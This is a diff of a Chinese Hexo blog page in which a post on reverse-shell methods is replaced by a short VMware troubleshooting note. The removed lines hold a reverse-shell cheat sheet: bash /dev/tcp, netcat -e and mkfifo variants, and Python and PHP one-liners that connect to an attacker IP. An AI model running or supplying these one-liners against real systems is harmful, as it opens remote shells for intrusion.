@@ -108,18 +108,18 @@
 
 
 
-  <meta name="description" content="大佬们都说这是外网渗透的最后一步，内网渗透的第一步，记录一下姿势…">
-<meta name="keywords" content="Hack">
+  <meta name="description" content="解决关于 VMware 的一些问题…">
+<meta name="keywords" content="Other">
 <meta property="og:type" content="article">
-<meta property="og:title" content="各种环境下反弹 shell 的方法">
-<meta property="og:url" content="https://p2hm1n.github.io/2019/06/12/各种环境下反弹-shell-的方法/index.html">
+<meta property="og:title" content="解决 VMware 的一些问题">
+<meta property="og:url" content="https://p2hm1n.github.io/2019/08/20/解决vmware的一些问题/index.html">
 <meta property="og:site_name" content="ONE PIECE">
-<meta property="og:description" content="大佬们都说这是外网渗透的最后一步，内网渗透的第一步，记录一下姿势…">
+<meta property="og:description" content="解决关于 VMware 的一些问题…">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-16T03:10:37.147Z">
+<meta property="og:updated_time" content="2019-08-20T02:39:13.590Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="各种环境下反弹 shell 的方法">
-<meta name="twitter:description" content="大佬们都说这是外网渗透的最后一步，内网渗透的第一步，记录一下姿势…">
+<meta name="twitter:title" content="解决 VMware 的一些问题">
+<meta name="twitter:description" content="解决关于 VMware 的一些问题…">
 
 
 
@@ -127,7 +127,7 @@
 
   
   
-  <link rel="canonical" href="https://p2hm1n.github.io/2019/06/12/各种环境下反弹-shell-的方法/">
+  <link rel="canonical" href="https://p2hm1n.github.io/2019/08/20/解决vmware的一些问题/">
 
 
 
@@ -137,7 +137,7 @@
   };
 </script>
 
-  <title>各种环境下反弹 shell 的方法 | ONE PIECE</title>
+  <title>解决 VMware 的一些问题 | ONE PIECE</title>
   
 
 
@@ -369,7 +369,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://p2hm1n.github.io/2019/06/12/各种环境下反弹-shell-的方法/">
+    <link itemprop="mainEntityOfPage" href="https://p2hm1n.github.io/2019/08/20/解决vmware的一些问题/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P2hm1n">
@@ -386,7 +386,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">各种环境下反弹 shell 的方法
+          <h1 class="post-title" itemprop="name headline">解决 VMware 的一些问题
 
               
             
@@ -412,24 +412,12 @@
                 
               
 
-              <time title="创建时间：2019-06-12 16:30:33" itemprop="dateCreated datePublished" datetime="2019-06-12T16:30:33+08:00">2019-06-12</time>
+              <time title="创建时间：2019-08-20 10:32:46 / 修改时间：10:39:13" itemprop="dateCreated datePublished" datetime="2019-08-20T10:32:46+08:00">2019-08-20</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-08-16 11:10:37" itemprop="dateModified" datetime="2019-08-16T11:10:37+08:00">2019-08-16</time>
               
             
           </span>
@@ -446,7 +434,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Hack/" itemprop="url" rel="index"><span itemprop="name">Hack</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Other/" itemprop="url" rel="index"><span itemprop="name">Other</span></a></span>
 
                 
                 
@@ -461,7 +449,7 @@
 
           
           
-            <span id="/2019/06/12/各种环境下反弹-shell-的方法/" class="leancloud_visitors" data-flag-title="各种环境下反弹 shell 的方法">
+            <span id="/2019/08/20/解决vmware的一些问题/" class="leancloud_visitors" data-flag-title="解决 VMware 的一些问题">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
@@ -486,7 +474,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">1.4k</span>
+                <span title="本文字数">145</span>
               
 
               
@@ -520,73 +508,16 @@
       
 
       
-        <p>大佬们都说这是外网渗透的最后一步，内网渗透的第一步，记录一下姿势…</p>
+        <p>解决关于 VMware 的一些问题…</p>
 <a id="more"></a>
-
-<h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ul>
-<li><strong>直接bash反弹：</strong><br><code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></li>
+<h1 id="开启虚拟机黑屏"><a href="#开启虚拟机黑屏" class="headerlink" title="开启虚拟机黑屏"></a>开启虚拟机黑屏</h1><ul>
+<li>起因</li>
 </ul>
+<p>可能是由于没有先关闭虚拟机，直接关闭了计算机，或者是虚拟机直接崩溃了…再打开虚拟机会直接黑屏</p>
 <ul>
-<li><p><strong>攻击机：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>被攻击机</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>解决方案</li>
 </ul>
-<br>
-
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><ul>
-<li><p><strong>需要被攻击机器上安装了nc</strong></p>
-</li>
-<li><p><strong>支持 -e 选项</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 1234</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>不能使用 - e 选项时：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">/bin/sh | nc attackerip 4444</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>安装的 NC 版本有问题时：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p><br><br></p>
-<h1 id="语言弹"><a href="#语言弹" class="headerlink" title="语言弹"></a>语言弹</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul>
-<li><p><strong>使用python反弹</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;&lt;ip&gt;&apos;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>攻击机监听</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>被攻击机反向连接</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;192.168.0.4&apos;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<br>
-
-<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p><strong>使用php反弹shell</strong></p>
-<ul>
-<li><p><strong>攻击：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 7777</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>被攻击</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php- &apos;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/7777&quot;)&apos;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<br>
-
-<ul>
-<li><p><strong>攻击</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>被攻击</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,7777);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
+<p>CMD命令行（管理员权限） 执行 <code>netsh winsock reset</code><br>在服务处重启与VMware相关的服务<br>重启电脑</p>
 
       
     </div>
@@ -621,7 +552,7 @@
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     
-    <a href="https://p2hm1n.github.io/2019/06/12/各种环境下反弹-shell-的方法/" title="各种环境下反弹 shell 的方法">https://p2hm1n.github.io/2019/06/12/各种环境下反弹-shell-的方法/</a>
+    <a href="https://p2hm1n.github.io/2019/08/20/解决vmware的一些问题/" title="解决 VMware 的一些问题">https://p2hm1n.github.io/2019/08/20/解决vmware的一些问题/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -637,7 +568,7 @@
         
         <div class="post-tags">
           
-            <a href="/tags/Hack/" rel="tag"># Hack</a>
+            <a href="/tags/Other/" rel="tag"># Other</a>
           
         </div>
       
@@ -650,8 +581,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/06/11/ISCC-2019-Web-Writeup/" rel="next" title="ISCC 2019 Web Writeup">
-                <i class="fa fa-chevron-left"></i> ISCC 2019 Web Writeup
+              <a href="/2019/08/16/内网渗透之常用命令小结/" rel="next" title="内网渗透之常用命令小结">
+                <i class="fa fa-chevron-left"></i> 内网渗透之常用命令小结
               </a>
             
           </div>
@@ -659,10 +590,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/06/12/论phpmyadmin下写入shell姿势/" rel="prev" title="论 phpmyadmin 下写入 shell 姿势">
-                论 phpmyadmin 下写入 shell 姿势 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -904,7 +831,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#nc"><span class="nav-number">1.</span> <span class="nav-text">nc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一"><span class="nav-number">1.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法二"><span class="nav-number">1.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#语言弹"><span class="nav-number">2.</span> <span class="nav-text">语言弹</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#python"><span class="nav-number">2.1.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">2.2.</span> <span class="nav-text">php</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#开启虚拟机黑屏"><span class="nav-number">1.</span> <span class="nav-text">开启虚拟机黑屏</span></a></li></ol></div>
             
 
           </div>
@@ -937,7 +864,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">241k</span>
+    <span title="站点总字数">240k</span>
   
 
   
@@ -946,7 +873,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">3:39</span>
+    <span title="站点阅读时长">3:38</span>
   
 </div>
 
@@ -1591,6 +1518,6 @@
   </script>
 
 
-<script type="text/javascript" src="/js/love.js"></script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+<script type="text/javascript" src="/js/love.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
